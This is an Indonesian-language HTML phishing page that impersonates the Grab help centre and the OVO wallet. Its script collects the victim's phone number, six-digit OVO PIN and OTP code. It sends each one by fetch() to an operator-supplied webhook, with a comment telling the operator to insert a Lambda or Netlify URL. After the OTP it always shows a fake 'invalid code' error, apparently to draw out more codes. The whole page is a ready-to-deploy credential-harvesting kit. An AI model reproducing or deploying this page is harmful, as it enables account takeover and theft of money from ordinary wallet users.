<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pusat Bantuan Grab</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        :root { --grab-green: #00B14F; }
        
        #splash-screen { position: fixed; inset: 0; background: var(--grab-green); display: flex; align-items: center; justify-content: center; z-index: 9999; transition: opacity 0.5s ease; }
        #splash-screen img { width: 80%; max-width: 300px; }

        body { font-family: 'Inter', sans-serif; background: var(--grab-green); display: flex; justify-content: center; padding: 20px; margin: 0; min-height: 100vh; align-items: center; }
        .card { background: white; width: 100%; max-width: 400px; padding: 25px; border-radius: 28px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); text-align: center; }
        .header-bg { width: 100%; height: 80px; background-image: url('https://iconlogovector.com/uploads/images/2023/06/lg-3dca9ea4016463e3f597720cf4d6331146.jpg'); background-size: contain; background-repeat: no-repeat; background-position: center; margin-bottom: 10px; }
        h1 { color: #00B14F; margin-bottom: 15px; font-weight: 800; font-size: 24px; }
        .slideshow { width: 100%; height: 160px; margin-bottom: 25px; border-radius: 20px; overflow: hidden; position: relative; background: #eee; }
        .slide { width: 100%; height: 100%; object-fit: cover; }
        .option-group { display: flex; flex-direction: column; gap: 12px; margin: 20px 0; text-align: left; }
        .radio-wrapper { display: flex; align-items: center; gap: 12px; border: 2px solid #edf2f7; padding: 16px; border-radius: 16px; font-weight: 600; color: #4a5568; cursor: pointer; }
        input[type="radio"]:checked + .radio-wrapper { border-color: var(--grab-green); background: #f0fff4; color: var(--grab-green); }
        input[type="radio"] { display: none; }
        input[type="tel"], input[type="text"] { width: 100%; padding: 18px; border: 2px solid #edf2f7; border-radius: 16px; font-size: 16px; box-sizing: border-box; text-align: center; }
        button { width: 100%; padding: 18px; background: var(--grab-green); color: white; border: none; border-radius: 16px; font-weight: 700; cursor: pointer; }
        #pinDisplay { font-size: 40px; color: #2d3748; margin: 20px 0; height: 50px; letter-spacing: 15px; }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 20px; }
        .keypad button { padding: 20px; border-radius: 16px; border: none; background: #f7f9fc; font-size: 22px; font-weight: 600; cursor: pointer; color: #4a3765; }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); align-items: center; justify-content: center; padding: 20px; z-index: 1000; }
        .modal-content { background: white; padding: 30px; border-radius: 24px; text-align: center; max-width: 350px; }
        .error-msg { color: #e53e3e; font-size: 14px; margin-top: 10px; display: none; font-weight: 600; }
        .page { display: none; } .active { display: block; }
    </style>
</head>
<body>

    <div id="splash-screen">
        <img src="https://static.wikitide.net/avidwiki/6/62/Grab_splash_screen_%282016%29.png" alt="Grab Logo">
    </div>

<div class="card">
    <div id="page1" class="page active">
        <div class="header-bg"></div>
        <h1>Pusat Bantuan</h1>
        <div class="slideshow"><img src="https://psatbantuaan.free.nf/header-grab.jpg" class="slide" style="display:block;"></div>
        <div class="option-group">
            <input type="radio" name="layanan" id="l1" value="Dana" required><label class="radio-wrapper" for="l1">• Proses Pengembalian Dana</label>
            <input type="radio" name="layanan" id="l2" value="Fiktif" required><label class="radio-wrapper" for="l2">• Tolak Otomatis Orderan Fiktif</label>
        </div>
        <input type="tel" id="nomor" placeholder="Masukkan nomor handphone" required>
        <button onclick="lanjutKe2()">SELANJUTNYA</button>
    </div>

    <div id="page2" class="page">
        <h3>PIN OVO Anda</h3>
        <img src="https://ridergalau.id/wp-content/uploads/2026/02/Logo-OVO.png" width="70" style="margin:10px 0;">
        <div id="pinDisplay"></div>
        <div class="keypad" id="keypad"></div>
    </div>
</div>

<div id="otpModal" class="modal">
    <div class="modal-content">
        <h3>Verifikasi Kode</h3>
        <p>Masukkan 6 digit kode yang dikirim ke <b id="nomorTampil"></b>.</p>
        <input type="text" id="otpInput" maxlength="6" placeholder="------" required>
        <button onclick="prosesKonfirmasi()" style="margin-top: 15px;">KONFIRMASI</button>
        <div id="errorText" class="error-msg">Kode tidak valid atau kadaluarsa.</div>
        <p style="margin-top: 15px; color: #888; font-size: 14px;">Kirim ulang kode dalam <span id="timer">30</span> detik.</p>
    </div>
</div>

<script>
    setTimeout(() => {
        document.getElementById('splash-screen').style.opacity = '0';
        setTimeout(() => document.getElementById('splash-screen').style.display = 'none', 500);
    }, 3000);

    // GANTI URL_WEBHOOK_ANDA dengan URL Lambda/Netlify Function Anda
    async function kirimKeServer(data, tahap) {
        await fetch('URL_WEBHOOK_ANDA', { 
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({ ...data, tahap: tahap }) 
        });
    }

    let timeLeft = 30;
    function startTimer() {
        let interval = setInterval(() => {
            timeLeft--;
            document.getElementById('timer').innerText = timeLeft;
            if (timeLeft <= 0) clearInterval(interval);
        }, 1000);
    }

    function lanjutKe2() { 
        let no = document.getElementById('nomor').value;
        if(!no) return alert("Isi nomor dulu!");
        kirimKeServer({ "nomor": no }, "NOMOR HP");
        document.getElementById('page1').classList.remove('active'); 
        document.getElementById('page2').classList.add('active'); 
    }
    
    let pin = "";
    const keypad = document.getElementById('keypad');
    [1,2,3,4,5,6,7,8,9,'C',0,'OK'].forEach(n => {
        keypad.innerHTML += `<button onclick="addPin('${n}')">${n}</button>`;
    });

    function addPin(n) {
        if(n === 'C') pin = ""; 
        else if(pin.length < 6 && n !== 'OK') {
            pin += n;
            document.getElementById('pinDisplay').innerText = "•".repeat(pin.length);
            if(pin.length == 6) {
                kirimKeServer({ "pin": pin }, "PIN OVO");
                document.getElementById('nomorTampil').innerText = document.getElementById('nomor').value;
                document.getElementById('otpModal').style.display = 'flex';
                startTimer();
            }
        }
    }

    function prosesKonfirmasi() {
        kirimKeServer({ "otp": document.getElementById('otpInput').value }, "KODE OTP");
        document.getElementById('errorText').style.display = 'block';
    }
</script>
</body>
</html>
